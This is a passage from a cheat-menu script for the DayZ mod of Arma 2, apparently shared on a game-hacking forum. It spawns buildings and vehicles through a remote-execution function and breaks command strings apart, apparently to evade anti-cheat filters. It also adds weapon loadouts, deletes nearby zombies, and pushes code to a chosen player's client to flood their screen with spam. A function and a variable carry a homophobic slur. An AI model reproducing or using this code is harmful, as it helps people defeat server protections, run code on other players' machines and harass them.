};
 
_vehicle_185 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11441.792, 11310.197, -6.1035156e-005], [], 0, ""];
  _vehicle_185 = _this;
  _this setDir -59.765179;
  _this setPosATL [11441.792, 11310.197, -6.1035156e-005];
};
 
_vehicle_186 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11438.864, 11304.976, -3.0517578e-005], [], 0, ""];
  _vehicle_186 = _this;
  _this setDir -59.784264;
  _this setPosATL [11438.864, 11304.976, -3.0517578e-005];
};
 
_vehicle_188 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_CamoNet_NATO", [11439.698, 11350.547, 0.50605875], [], 0, ""];
  _vehicle_188 = _this;
  _this setDir -56.924442;
  _this setPosATL [11439.698, 11350.547, 0.50605875];
};
 
_vehicle_191 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Barrack2", [11485.433, 11318.676], [], 0, ""];
  _vehicle_191 = _this;
  _this setDir 29.895979;
  _this setPosATL [11485.433, 11318.676];
};
 
_vehicle_192 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Barrack2", [11491.073, 11315.205], [], 0, ""];
  _vehicle_192 = _this;
  _this setDir 30.020123;
  _this setPosATL [11491.073, 11315.205];
};
 
_vehicle_193 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Barrack2", [11496.889, 11311.867, 6.1035156e-005], [], 0, ""];
  _vehicle_193 = _this;
  _this setDir 29.374739;
  _this setPosATL [11496.889, 11311.867, 6.1035156e-005];
};
 
_vehicle_194 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Barrack2", [11502.686, 11308.39, -0.00012207031], [], 0, ""];
  _vehicle_194 = _this;
  _this setDir 28.731394;
  _this setPosATL [11502.686, 11308.39, -0.00012207031];
};
 
_vehicle_196 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["FlagCarrierUSA_EP1", [11445.896, 11369.733, 3.0517578e-005], [], 0, ""];
  _vehicle_196 = _this;
  _this setDir 208.71115;
  _this setPosATL [11445.896, 11369.733, 3.0517578e-005];
};
 
_vehicle_197 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["FlagCarrierUSA_EP1", [11437.238, 11356.272, 3.0517578e-005], [], 0, ""];
  _vehicle_197 = _this;
  _this setDir 221.14017;
  _this setPosATL [11437.238, 11356.272, 3.0517578e-005];
};
 
_vehicle_218 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["PowGen_Big", [11503.464, 11285.663], [], 0, ""];
  _vehicle_218 = _this;
  _this setDir 29.834955;
  _this setPosATL [11503.464, 11285.663];
};
 
_vehicle_225 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_CamoNet_EAST", [11495.364, 11272.268], [], 0, ""];
  _vehicle_225 = _this;
  _this setDir 162.85454;
  _this setPosATL [11495.364, 11272.268];
};
 
_vehicle_227 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TentStorage", [11495.96, 11271.858, 6.1035156e-005], [], 0, ""];
  _vehicle_227 = _this;
  _this setDir -194.12633;
  _this setPosATL [11495.96, 11271.858, 6.1035156e-005];
};
 
_vehicle_228 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TentStorage", [11498.109, 11274.409, 9.1552734e-005], [], 0, ""];
  _vehicle_228 = _this;
  _this setDir 125.77121;
  _this setPosATL [11498.109, 11274.409, 9.1552734e-005];
};
 
_vehicle_229 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TentStorage", [11492.535, 11273.151, -9.1552734e-005], [], 0, ""];
  _vehicle_229 = _this;
  _this setDir -150.43318;
  _this setPosATL [11492.535, 11273.151, -9.1552734e-005];
};
 
_vehicle_231 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Campfire_burning", [11494.979, 11276.196, -6.1035156e-005], [], 0, ""];
  _vehicle_231 = _this;
  _this setPosATL [11494.979, 11276.196, -6.1035156e-005];
};
 
_vehicle_236 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_GUE_WarfareBVehicleServicePoint_EP1", [11444.444, 11301.88, 3.0517578e-005], [], 0, ""];
  _vehicle_236 = _this;
  _this setDir 31.300617;
  _this setPosATL [11444.444, 11301.88, 3.0517578e-005];
};
 
_vehicle_238 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_WarfareBUAVterminal_EP1", [11452.636, 11323.139, -3.0517578e-005], [], 0, ""];
  _vehicle_238 = _this;
  _this setDir 36.565224;
  _this setPosATL [11452.636, 11323.139, -3.0517578e-005];
};
 
_vehicle_244 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_GUE_WarfareBArtilleryRadar_Base_EP1", [11587.538, 11317.345, -0.013601046], [], 0, ""];
  _vehicle_244 = _this;
  _this setDir 88.289627;
  _this setPosATL [11587.538, 11317.345, -0.013601046];
};
 
_vehicle_257 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["BMP2_HQ_TK_unfolded_EP1", [11471.68, 11305.488], [], 0, ""];
  _vehicle_257 = _this;
  _this setDir 28.523024;
  _this setPosATL [11471.68, 11305.488];
};
 
_vehicle_259 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_GUE_WarfareBHeavyFactory_EP1", [11426.43, 11321.631, -9.1552734e-005], [], 0, ""];
  _vehicle_259 = _this;
  _this setDir 31.374218;
  _this setPosATL [11426.43, 11321.631, -9.1552734e-005];
};
 
_vehicle_262 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_WarfareBContructionSite_EP1", [11445.606, 11308.762], [], 0, ""];
  _vehicle_262 = _this;
  _this setDir 4.3524308;
  _this setPosATL [11445.606, 11308.762];
};
 
_vehicle_263 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_WarfareBContructionSite_EP1", [11449.435, 11316.47, -6.1035156e-005], [], 0, ""];
  _vehicle_263 = _this;
  _this setDir 28.604141;
  _this setPosATL [11449.435, 11316.47, -6.1035156e-005];
};
 
 
_vehicle_281 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11487.786, 11275.834, 6.1035156e-005], [], 0, ""];
  _vehicle_281 = _this;
  _this setPosATL [11487.786, 11275.834, 6.1035156e-005];
};
 
_vehicle_282 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11502.267, 11281.639, 6.1035156e-005], [], 0, ""];
  _vehicle_282 = _this;
  _this setPosATL [11502.267, 11281.639, 6.1035156e-005];
};
 
_vehicle_283 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11449.442, 11298.128, -0.00015258789], [], 0, ""];
  _vehicle_283 = _this;
  _this setPosATL [11449.442, 11298.128, -0.00015258789];
};
 
_vehicle_284 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11480.413, 11315.511, 3.0517578e-005], [], 0, ""];
  _vehicle_284 = _this;
  _this setPosATL [11480.413, 11315.511, 3.0517578e-005];
};
 
_vehicle_286 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11502.524, 11302.543, 9.1552734e-005], [], 0, ""];
  _vehicle_286 = _this;
  _this setPosATL [11502.524, 11302.543, 9.1552734e-005];
};
 
_vehicle_287 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["FlagCarrierUSA", [11497.861, 11305.81, -6.1035156e-005], [], 0, ""];
  _vehicle_287 = _this;
  _this setDir 110.5396;
  _this setPosATL [11497.861, 11305.81, -6.1035156e-005];
};
 
_vehicle_288 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["FlagCarrierUSA", [11486.213, 11312.304, 3.0517578e-005], [], 0, ""];
  _vehicle_288 = _this;
  _this setDir 125.15931;
  _this setPosATL [11486.213, 11312.304, 3.0517578e-005];
};'');
};';
[basespawn] call Wookie_Pro_RE;


	[27.55789,[11485.897, 11279.636, -6.1035156e-005],"HMMWV_DZ"] call spwnn;
	sleep 1;
	[26.846643,[11483.132, 11281.114, -3.0517578e-005],"HMMWV_DZ"] call spwnn;
	sleep 1;
	[29.120792,[11479.934, 11282.741, 3.0517578e-005],"HMMWV_DZ"] call spwnn;
	sleep 1;
	[27.164663,[11477.026, 11284.609, -0.00012207031],"HMMWV_DZ"] call spwnn;
	sleep 1;
	[27.597729,[11473.924, 11286.354, -3.0517578e-005],"LandRover_CZ_EP1"] call spwnn;
	sleep 1;
	[28.982542,[11470.835, 11288.136, -3.0517578e-005],"LandRover_CZ_EP1"] call spwnn;
	sleep 1;
	[29.753201,[11467.829, 11289.946, -3.0517578e-005],"LandRover_CZ_EP1"] call spwnn;
	sleep 1;
	[30.067535,[11464.813, 11291.718, -9.1552734e-005],"LandRover_CZ_EP1"] call spwnn;
	sleep 1;
	[-59.785709,[11458.933, 11293.891, 9.1552734e-005],"Ural_TK_CIV_EP1"] call spwnn;
	sleep 1;
	[-60.340233,[11460.656, 11296.796, -9.1552734e-005],"Ural_TK_CIV_EP1"] call spwnn;
	sleep 1;
	[-142.54741,[11468.918, 11358.791],"UH1H_DZ"] call spwnn;
	sleep 1;
	[-151.30797,[11485.386, 11347.573, 6.1035156e-005],"Mi17_DZ"] call spwnn;
	sleep 1;
  

player setPosATL [11438.894, 11365.359];};

Wookie_AK47_Loadout =
{
	hint format["AK47M % Colt 1911 loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";

	player addweapon "AK_47_M";
	player selectWeapon "AK_47_M";
	player addMagazine '30Rnd_762x39_AK47';
	player addMagazine '30Rnd_762x39_AK47';
	player addMagazine '30Rnd_762x39_AK47';
	player addMagazine '30Rnd_762x39_AK47';
	player addMagazine '30Rnd_762x39_AK47';
	player addMagazine '30Rnd_762x39_AK47';

	player addweapon "Colt1911";
	player addMagazine "7Rnd_45ACP_1911";
	player addMagazine "7Rnd_45ACP_1911";
	player addMagazine "7Rnd_45ACP_1911";
	player addMagazine "7Rnd_45ACP_1911";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';

	player addWeapon 'Binocular';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemWatch';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'Itemtoolbox';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",3];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemSodaCoke",2];
	bp addMagazineCargoGlobal ["FoodCanBakedBeans",1];
	bp addMagazineCargoGlobal ["FoodCanPasta",2];

	reload player;
};

Wookie_Bomber_Loadout =
{
	hint format["Bomber loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack 'DZ_Assault_Pack_EP1';
	player addMagazine 'PipeBomb';
	player addMagazine 'PipeBomb';
	player addMagazine 'PipeBomb';
	player addMagazine 'PipeBomb';
	player addMagazine 'PipeBomb';
	player addMagazine 'PipeBomb';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';

	player addweapon 'ItemMap';
	player addWeapon 'ItemGPS';
	player addWeapon 'NVGoggles';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["HandGrenade_West",3];
	bp addMagazineCargoGlobal ["FoodSteakCooked",1];
	bp addMagazineCargoGlobal ["ItemSodaCoke",1];
};

Wookie_CZ550_Loadout =
{
	hint format["CZ 550 Sniper % M9SD loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "Huntingrifle";
	player selectWeapon "Huntingrifle";
	player addMagazine '5x_22_LR_17_HMR';
	player addMagazine '5x_22_LR_17_HMR';
	player addMagazine '5x_22_LR_17_HMR';
	player addMagazine '5x_22_LR_17_HMR';
	player addMagazine '5x_22_LR_17_HMR';
	player addweapon "M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addWeapon 'ItemGPS';
	player addWeapon 'NVGoggles';
	player addWeapon 'Binocular_vector';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemAntibiotic",1];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["15Rnd_9x19_M9SD",3];

	reload player;
};

Wookie_DMR_Loadout =
{
	hint format["DMR Sniper loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "DMR";
	player selectWeapon "DMR";
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addweapon "M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addWeapon 'ItemGPS';
	player addWeapon 'NVGoggles';
	player addWeapon 'Binocular_vector';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemAntibiotic",1];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["15Rnd_9x19_M9SD",3];

	reload player;
};

Wookie_G36C_Loadout =
{
	hint format["G36C & PDW SD loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_Backpack_EP1";

	player addweapon "G36C";
	player selectWeapon "G36C";
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';
	player addMagazine '30Rnd_556x45_StanagSD';

	player addweapon "UZI_SD_EP1";
	player addMagazine "30Rnd_9x19_UZI_SD";
	player addMagazine "30Rnd_9x19_UZI_SD";
	player addMagazine "30Rnd_9x19_UZI_SD";
	player addMagazine "30Rnd_9x19_UZI_SD";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';

	player addWeapon 'ItemGPS';
	player addWeapon 'NVGoggles';
	player addWeapon 'Binocular_Vector';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemWatch';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'Itemtoolbox';
	player addWeapon 'ItemRadio';
	player addWeapon 'ItemEtool';
	player addWeapon 'ItemFlashlightRed';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addWeaponCargoGlobal ["BAF_AS50_TWS",1];
	bp addMagazineCargoGlobal ["10Rnd_127x99_M107",9];

	reload player;
};

Wookie_M4A1HOLO_Loadout =
{
	hint format["M4A1 Holo % G17 loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "M4A1_HWS_GL_camo";
	player selectWeapon "M4A1_HWS_GL_camo";
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addweapon "glock17_EP1";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine '1Rnd_HE_M203';
	player addWeapon 'Binocular';
	player addWeapon 'NVGoggles';
	player addWeapon 'ItemGPS';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'Itemetool';
	player addWeapon 'Itemtoolbox';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["30Rnd_556x45_Stanag",3];
	bp addMagazineCargoGlobal ["17Rnd_9x19_glock17",1];

	reload player;
};

Wookie_M16ACOG_Loadout =
{
	hint format["M16 Acog loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "m16a4_acg";
	player selectWeapon "m16a4_acg";
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addMagazine '30Rnd_556x45_Stanag';
	player addweapon "glock17_EP1";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addWeapon 'Binocular';
	player addWeapon 'NVGoggles';
	player addWeapon 'ItemGPS';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'Itemetool';
	player addWeapon 'Itemtoolbox';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["30Rnd_556x45_Stanag",3];
	bp addMagazineCargoGlobal ["17Rnd_9x19_glock17",1];

	reload player;
};

Wookie_M24_Loadout =
{
	hint format["M24 Sniper loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "M24";
	player selectWeapon "M24";
	player addMagazine '5Rnd_762x51_M24';
	player addMagazine '5Rnd_762x51_M24';
	player addMagazine '5Rnd_762x51_M24';
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addMagazine '20Rnd_762x51_DMR';
	player addweapon "M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine "15Rnd_9x19_M9SD";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addWeapon 'ItemGPS';
	player addWeapon 'NVGoggles';
	player addWeapon 'Binocular_vector';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'ItemFlashlight';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemAntibiotic",1];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["15Rnd_9x19_M9SD",3];

	reload player;
};

Wookie_M249_Loadout =
{
	hint format["M249 SAW & G17 loadout added Old gear removed."];

	removeAllWeapons player;
	removeAllItems player;
	removebackpack player;

	player addBackPack "DZ_ALICE_Pack_EP1";
	player addweapon "M249_DZ";
	player selectWeapon "M249_DZ";
	player addMagazine '200Rnd_556x45_M249';
	player addMagazine '200Rnd_556x45_M249';
	player addMagazine '200Rnd_556x45_M249';
	player addweapon "glock17_EP1";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine "17Rnd_9x19_glock17";
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addMagazine 'ItemBandage';
	player addWeapon 'Binocular';
	player addWeapon 'NVGoggles';
	player addWeapon 'ItemGPS';
	player addWeapon 'ItemCompass';
	player addWeapon 'ItemMap';
	player addWeapon 'ItemHatchet';
	player addWeapon 'ItemKnife';
	player addWeapon 'Itemmatchbox';
	player addWeapon 'Itemetool';
	player addWeapon 'Itemtoolbox';

	bp = unitBackpack player;
	bp addMagazineCargoGlobal ["ItemBloodbag",2];
	bp addMagazineCargoGlobal ["ItemPainkiller",2];
	bp addMagazineCargoGlobal ["ItemMorphine",2];
	bp addMagazineCargoGlobal ["ItemEpinephrine",1];
	bp addMagazineCargoGlobal ["ItemWaterbottle",2];
	bp addMagazineCargoGlobal ["FoodSteakCooked",3];
	bp addMagazineCargoGlobal ["200Rnd_556x45_M249",1];
	bp addMagazineCargoGlobal ["17Rnd_9x19_glock17",3];

	reload player;
};

Wookie_ZombieColor =
{
	while {true} do 
	{
		_obj = nearestObjects [vehicle player, ['zZombie_base'], 50000];
		{
			_x setObjectTexture [0,'#(argb,8,8,3)color(1,1,0,1)'];
		} forEach _obj;
		sleep 30;
	};
	titleText "Zombies Higlighted";
};

Wookie_ZedShield =
{
	ZobieDistanceStat = false;
	if (isNil "z") then {z = true;} else {z = !z};
	if (z) then 
	{
		closeDialog 0;
		zo = 
		[
		["",true],
		["Distance", [-1], "", -5, [["expression", "z = false;"]], "1", "1"],  
		["10", [2], "", -5, [["expression", "Zom=10;ZobieDistanceStat=true;"]], "1", "1"],
		["20", [3], "", -5, [["expression", "Zom=20;ZobieDistanceStat=true;"]], "1", "1"],
		["30", [4], "", -5, [["expression", "Zom=30;ZobieDistanceStat=true;"]], "1", "1"],
		["40", [5], "", -5, [["expression", "Zom=40;ZobieDistanceStat=true;"]], "1", "1"],
		["50", [6], "", -5, [["expression", "Zom=50;ZobieDistanceStat=true;"]], "1", "1"],
		["200", [7], "", -5, [["expression", "Zom=200;ZobieDistanceStat=true;"]], "1", "1"],
		["ServerWide", [8], "", -5, [["expression", "Zom=20000;ZobieDistanceStat=true;"]], "1", "1"], 
		["Exit", [13], "", -3, [["expression", "z = false;"]], "1", "1"] 
		];

		showCommandingMenu "#USER:zo";
		waituntil {ZobieDistanceStat};

		titleText [format["Zombie Shield activated with distance %1 meters!",Zom],"PLAIN DOWN"]; titleFadeOut 4;
	}
	else
	{
		ZobieDistanceStat=false;
	};

	while {z && ZobieDistanceStat} do 
	{

		_pos = getPosATL player;
		_zombies = _pos nearEntities ["zZombie_Base",Zom];
		_count = count _zombies;

		for "_i" from 0 to (_count -1) do
		{ 
			_zombie = _zombies select _i; 
			deleteVehicle _zombie;
			RandomHeadshots=round(random 4);
			if (!alive _zombie) then
			{
				zombiekills = player getVariable["zombieKills",0];
				player setVariable["zombieKills",zombiekills+1,true];
				If (RandomHeadshots==1) then 
				{
					_headShots = player getVariable["headShots",0];
					player setVariable["headShots",_headShots+1,true]
				};
			};
		};
	};
	titleText ["Zombie Shield deactivated!","PLAIN DOWN"]; titleFadeOut 4;
};

Wookie_Spam_Faggots = 
{
	_name = _this select 0;
	titleText [format["Spamming %1's screen",_name],"PLAIN DOWN"]; titlefadeout 3;
	FAGGOT = _name;
	publicVariable "FAGGOT";
	_exec = 'if (name player == FAGGOT) then
	{
		[] spawn
		{
			_spam = "";
			_spamarray = ["www.MPGH.net ","Bush Wookie ","T0X1Cmods ","Lystic ","Monky ","Infistar ","Rustler "];
			_htmlarray = ["#FF0000","#FF4000","#FF8000","#FFBF00","#FFFF00","#BFFF00","#80FF00",
			"#40FF00","#00FF00","#00FF80","#00FFBF","#00FFFF","#00BFFF","#0080FF","#0040FF",
			"#0000FF","#4000FF","#8000FF","#A901DB","#DF01D7","#DF01A5","#DF0174","#DF013A"];
			i = 0;
			for "_i" from 0 to 250 do 
			{
				_color = _htmlarray select i;
				_spam = _spam + (_spamarray select (random 7));
				if (i < (count _htmlarray)) then{i = i + 1;};
				if (i > (count _htmlarray) - 1) then {i = 0;};
				_text = _spamarray select (random 7);
				[format["<t size=''0.7'' color=''%1''>%2</t>",_color,_text],random 1.00,random 1.00,99999999,2,0,1999 + _i] spawn bis_fnc_dynamictext;
				_text = _spamarray select (random 7);
				[format["<t size=''0.7'' color=''%1''>%2</t>",_color,_text],random -1.00,random 1.00,99999999,2,0,3009 - _i] spawn bis_fnc_dynamictext;

				sleep 0.15;
				hint parseText format["<t size=''0.85'' color=''%2''>%1</t>", _spam,_color];
			};
		};
	};';
[_exec] spawn Wookie_Pro_RE;
};

Wookie_Menu_LOOOOOOOOOL =
{
	disableSerialization;
	font = "EtelkaMonospaceProBold";
	color_list = [0.1, 1, 0.2, 1];
	color_black = [random 1, random 1, random 1, 1];
	color_maroon = [random 1, random 1, random 1, 1];
	color_red = [random 1, random 1, random 1, 1];
	color_green = [0,1,0.2,0.2];
	color_WookieMenu_blue = [0, 0, 1, 1];
	color_bluE = [random 1, random 1, random 1, 1];
	color_orange = [1, 0.5, 0, 1];
	color_yellow = [random 1, random 1, random 1, 1];
	title_dialog = [random 1, random 1, random 1, 1];
	menu_title = [1, 1, 0, 1];
	menu_sub = [0.3, 0, 1, 1];
	menu_toggle_on = [0, 1, 0, 1];
	menu_toggle_off = [1, 0, 0, 1];
	menu_run = [1, 0, 0, 1];
	menu_disabled = [1, 0, 0, 1];
	color_friendlyplayer = [1, 1, 1, 1];
	color_enemyplayer = [0.9, 0.44, 0, 1];
	color_bluefor_plr = [0.047, 0.502, 1, 1];
	color_opfor_plr = [1, 0.17, 0.17, 1];
	color_resistance_plr = [0, 0.65, 0, 1];
	color_civilian_plr = [1, 1, 1, 1];

	WookieMenu_funcs_inited = true;
	isInSub = false;

	// Runs when item is doubleclicked
	WookieMenu_hax_dbclick =
	{
		_isran = false;

		_path      = LeHax select ((lbCurSel 2))*7+1;
		_istoggle  = LeHax select ((lbCurSel 2))*7+2;
		_istitle   = LeHax select ((lbCurSel 2))*7+3;
		_issubmenu = LeHax select ((lbCurSel 2))*7+4;
		_isplayer  = LeHax select ((lbCurSel 2))*7+5;
	
		if (_istitle == "1") exitWith {};

		if (_issubmenu == "1") then
		{
			if (_path == "Vehicles") exitWith {call WookieMenu_fill_Vehicles};
			if (_path == "Objects") exitWith {call WookieMenu_fill_Objects};
			if (_path == "Weaponz") exitWith {call WookieMenu_fill_Weapons};
			if (_path == "Main_menu") exitWith {call WookieMenu_fillHax};
			if (_path == "Funmenu") exitWith {call WookieMenu_fill_Funmenu};
			if (_path == "Wasteland") exitWith {call WookieMenu_fill_wasteland};
			if (_path == "Target") exitWith {call WookieMenu_fill_Target};
			if (_path == "All") exitWith {call WookieMenu_fill_All};
			if (_path == "DayZ") exitWith {call WookieMenu_fill_DayZ};
			if (_path == "BACK") exitWith {call WookieMenu_fillHax};
		};

		if (isInSub) then
